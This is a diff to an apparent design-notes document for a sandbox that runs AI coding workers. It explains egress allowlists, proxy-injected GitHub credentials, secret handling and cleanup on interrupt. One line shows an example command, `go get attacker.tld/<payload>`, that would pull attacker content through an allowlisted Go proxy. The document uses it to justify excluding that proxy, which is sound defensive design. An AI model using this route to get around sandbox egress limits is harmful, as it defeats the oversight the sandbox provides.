@@ -14,12 +14,18 @@ would let the worker push to it with the credential git still has in memory.
 ### The `dev-registries` preset (ADR 0002 #1)
 
 With plain deny-all the worker cannot `bun install` or run most test suites,
-which defeats the purpose of a coding sandbox. Package registries need
-credentials the sandbox does not have to publish anything, so their value as
-exfiltration targets is low. `--egress strict` exists for repositories where
-even that is too much, and `--allow-host` adds the rest case by case. Caveat:
-some registries are CDN-fronted, so an allowlisted host name may be shared
-with unrelated services behind the same CDN.
+which defeats the purpose of a coding sandbox. Package registries serve
+fixed content and need credentials the sandbox does not have to publish
+anything, so their value as exfiltration targets is low. That is also why
+GOPROXY (`proxy.golang.org`, with `sum.golang.org`) is not in the preset: a
+Go module proxy fetches whatever origin a module path names, on demand, so one
+`go get attacker.tld/<payload>` through it reaches the attacker from behind an
+allowlisted host. Go users add it with `--allow-host proxy.golang.org` and
+accept that. `--egress strict` exists for repositories where even the preset is
+too much, and `--allow-host` adds the rest case by case. Caveat: some
+registries are CDN-fronted, so an allowlisted host name may be shared with
+unrelated services behind the same CDN, and E2B's `allowOut` may match on the
+resolved IP rather than the SNI (open check in RUNBOOK).
 
 ### API key only, injected by the proxy (ADR 0002 #2, ADR 0001)
 
@@ -43,8 +49,15 @@ slice 06b only fills it.
 The #623 fix moved the token from argv into git's credential file, which E2B
 logs by path only. A transform rule is better still: the token never enters
 the machine, and dropping the rule after the clone means a worker that later
-finds a way to talk to github.com has no credential to use. The credential
-file stays as the fallback when the secret store is unavailable.
+finds a way to talk to github.com has no credential to use; the secret behind
+it is destroyed at the same moment. The credential file stays as the fallback
+when the secret store is unavailable, and `--github-auth file` selects it
+outright for hosts where the proxy's rule is not honoured (CA trust, see
+RUNBOOK) so a private clone can still run without `env` model auth.
+
+The broker grant of slice 06b goes the same way: `rules` are visible to anyone
+holding the E2B key, so the grant lives in the secret store and only its
+placeholder is in the rule.
 
 ### `--keep` kept, but locked (ADR 0002 #4)
 
@@ -61,6 +74,21 @@ from an injection. Writing the text to files and passing `"$(cat …)"` keeps
 the text out of argv and out of the shell parser at the same time. A
 `--instructions-file` flag on `ravi tasks create` was rejected because that
 command is not CliOnly and the flag would drift the SDKs.
+
+### Ctrl-C twice
+
+A kill against E2B can take seconds. With `process.once`, a second Ctrl-C in
+that window would drop the handler and end the process by default, leaving the
+sandbox and its secrets behind, which is exactly what the first Ctrl-C was
+trying to prevent. Handlers stay on with `process.on`, repeats are noted once
+and ignored, and one time limit over kill plus secret removal bounds how long
+the process can linger.
+
+### Task text capped at 100 KiB
+
+Title and instructions are expanded with `$(cat …)` into one command line
+inside the sandbox; a cap keeps that inside what a shell and E2B's file API
+accept, and anything longer belongs in the repository the worker already has.
 
 ### Kill, not pause, on timeout
 
